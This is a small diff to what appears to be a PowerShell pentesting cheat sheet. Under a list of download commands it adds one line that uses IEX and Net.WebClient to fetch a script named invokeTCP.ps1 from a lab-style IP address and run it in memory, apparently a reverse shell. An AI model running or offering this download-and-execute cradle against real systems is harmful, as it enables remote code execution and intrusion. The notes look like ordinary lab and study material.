@@ -71,6 +71,7 @@ $testVar = "blabla"
 ```
 Invoke-WebRequest <uri>
 wget <uri>
+powershell -c "IEX(New-Object Net.webClient).downloadString('http://10.10.14.6:8080/invokeTCP.ps1')"
 ```
 
 **Grep**
